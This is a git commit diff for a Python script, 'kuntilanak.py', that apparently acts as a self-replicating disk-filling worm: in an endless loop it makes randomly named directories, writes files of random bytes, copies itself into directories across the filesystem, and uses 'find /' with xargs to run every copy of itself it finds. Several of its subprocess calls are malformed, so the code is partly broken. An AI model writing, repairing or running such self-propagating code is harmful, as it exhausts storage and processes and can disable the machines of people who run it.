85a8cf30275b1a1a07a47bd20ac1df86693ab028
CukiD <40711562+Tektek9@users.noreply.github.com>
2024-02-12 17:18:26 +0700

    kunti

--- kuntilanak.py
+++ kuntilanak.py
@@ -7,12 +7,13 @@ import os
 from termcolor import colored as cl
 
 class zetsu:
-    def __init__(self, nn, ii, ff, pj, yh):
+    def __init__(self, nn, ii, ff, pj, yh, tt):
         self.nn = nn
         self.ii = ii
         self.ff = ff
         self.pj = pj
         self.yh = yh
+        self.tt = tt
 
     def logo():
         print(cl("""
@@ -28,6 +29,19 @@ class zetsu:
         with open(bb, 'wb') as file:
             file.write(os.urandom(aa*kb))
 
+    def lanjut(self):
+        yy = [f'ls -h | grep / | xargs -I % cp {self.tt[-1]} %/{self.tt[-1]}', f'find / | grep {self.yh} | uniq | xargs -I @ python3 @']
+        bb = 'find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',self.tt[-1],'@'
+        subprocess.call(['mkdir', self.tt[-1]])
+        self.genuk(1024, self.ff)
+        subprocess.call(['cp',self.ff,self.tt[-1]])
+        for _ in range(2):
+            subprocess.call([f'cp {self.yh} $pwd/{self.tt[-1]}'])
+        subprocess.call([yy[0]])
+        subprocess.call([yy[1]])
+        subprocess.call([bb])
+        subprocess.call([yy[1]])
+
     def main(self):
         while(self.ii > 0):
             rn = ''.join(random.choice(string.ascii_letters) for _ in range(self.pj))
@@ -35,27 +49,13 @@ class zetsu:
                 if self.ii == self.ii:
                     self.ii += 1
                     dir = rn+str(self.ii)
-                    subprocess.call(['mkdir', dir])
-                    self.genuk(1024, self.ff)
-                    subprocess.call(['cp',self.ff,dir])
-                    subprocess.call([f'cp {self.yh} $pwd/{dir}'])
-                    subprocess.call([f'cp {self.nn} $pwd/{dir}'])
-                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
-                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
-                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
-                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+                    self.tt.append(dir)
+                    self.lanjut()
                 elif self.ii <= self.ii:
                     self.ii += 2
                     dir = rn+str(self.ii)
-                    subprocess.call(['mkdir', dir])
-                    self.genuk(1024, self.ff)
-                    subprocess.call(['cp',self.ff,dir])
-                    subprocess.call([f'cp {self.yh}',dir])
-                    subprocess.call(['cp',self.nn,dir])
-                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
-                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
-                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
-                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
+                    self.tt.append(dir)
+                    self.lanjut()
             except KeyboardInterrupt:
                 zetsu.main(self.nn, self.ii, self.ff, self.pj, self.yh)
 
@@ -67,5 +67,6 @@ if __name__ == "__main__":
     panjang = 16
     yuhu = sys.argv[0]
     namaprogram = yuhu[2:]
+    tmp = []
     zetsu.logo()
-    zetsu.main(nama, i, filename, panjang, namaprogram)
+    zetsu.main(nama, i, filename, panjang, namaprogram, tmp)
